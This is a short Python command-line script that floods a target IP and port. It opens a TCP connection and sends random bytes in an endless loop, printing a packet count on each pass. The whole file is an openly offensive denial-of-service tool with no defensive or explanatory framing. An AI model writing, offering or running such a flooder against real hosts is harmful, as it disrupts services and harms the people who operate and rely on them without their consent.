import socket
import random
import click


@click.command()
@click.option('--ip', '-i', type=str, prompt=True, help="IP of target")
@click.option('--port', '-p',type=int, prompt=True, help="Target port")
@click.option('--bytes', '-b',type=int, prompt=True, help="Number of bytes")

def main(ip, port, bytes):
    # create socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # create random bytes
    num_bytes = random._urandom(bytes)

    # establish connection
    addr = (ip, port)
    tcp_socket.connect(addr)
    # socket timout
    tcp_socket.settimeout(None)

    send(ip, port, tcp_socket, num_bytes)


def send(ip, port, tcp_socket, num_bytes):
    # make stream infinite
    sent = 0
    while True:
        tcp_socket.sendto(num_bytes, (ip, port))
        print('Sent {} TCP Packets to {} at port {}'.format(sent, ip, port))
        sent = sent + 1


if __name__ == '__main__':
    main()





